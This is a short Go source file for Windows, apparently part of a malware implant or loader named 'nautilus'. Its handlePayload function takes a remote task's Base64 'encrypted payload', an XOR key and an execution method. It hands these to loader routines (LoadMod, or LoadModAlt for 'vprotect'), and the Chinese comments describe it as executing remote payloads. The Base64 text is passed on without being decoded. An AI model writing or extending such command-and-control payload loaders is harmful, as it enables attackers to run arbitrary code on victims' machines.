//go:build windows

package main

import (
	"fmt"
	"nautilus/core"
)

// handlePayload 处理远程载荷执行任务
func handlePayload(params map[string]string) string {
	payloadB64 := params["payload"] // Base64编码的加密载荷
	xorKeyStr := params["key"]      // XOR解密密钥
	method := params["method"]      // 执行方式

	if payloadB64 == "" {
		return "error: missing parameter"
	}

	var xorKey byte = 0x55
	if xorKeyStr != "" {
		var k int
		fmt.Sscanf(xorKeyStr, "%d", &k)
		xorKey = byte(k)
	}

	// 转换为byte切片
	payloadBytes := []byte(payloadB64)

	var err error
	switch method {
	case "vprotect":
		err = core.LoadModAlt(payloadBytes, xorKey)
	default:
		err = core.LoadMod(payloadBytes, xorKey)
	}

	if err != nil {
		return fmt.Sprintf("exec failed: %v", err)
	}
	return "ok"
}
